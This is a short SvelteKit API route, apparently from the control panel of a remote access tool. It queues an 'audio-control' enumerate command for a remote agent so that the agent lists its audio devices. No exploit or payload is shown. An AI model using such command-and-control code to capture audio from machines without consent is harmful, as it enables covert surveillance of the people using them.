import { randomUUID } from 'crypto';
import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { registry, RegistryError } from '$lib/server/rat/store';
import { audioBridgeManager } from '$lib/server/rat/audio';
import type { AudioControlCommandPayload } from '$lib/types/audio';

export const POST: RequestHandler = ({ params }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	const requestId = randomUUID();
	audioBridgeManager.markInventoryRequest(id, requestId);

	const payload: AudioControlCommandPayload = {
		action: 'enumerate',
		requestId
	};

	try {
		registry.queueCommand(id, { name: 'audio-control', payload });
	} catch (err) {
		if (err instanceof RegistryError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to queue audio inventory command');
	}

	return json({ requestId });
};
